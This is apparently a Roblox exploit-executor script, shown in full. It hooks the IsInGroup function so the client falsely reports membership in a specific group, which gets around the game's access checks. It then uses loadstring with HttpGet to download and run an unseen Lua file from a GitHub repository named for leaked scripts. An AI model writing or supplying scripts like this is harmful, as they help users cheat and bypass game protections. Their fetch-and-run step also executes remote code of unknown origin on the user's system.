local old = game:GetService("Players").LocalPlayer.IsInGroup

hookfunction(game:GetService("Players").LocalPlayer.IsInGroup, newcclosure(function(self, id)
if id == 12271076 then
return true
end
return old(self, id)
end))

loadstring(game:HttpGet('https://raw.githubusercontent.com/robloxscriptleaks/Resources_WillsScripts/main/4.lua'))()
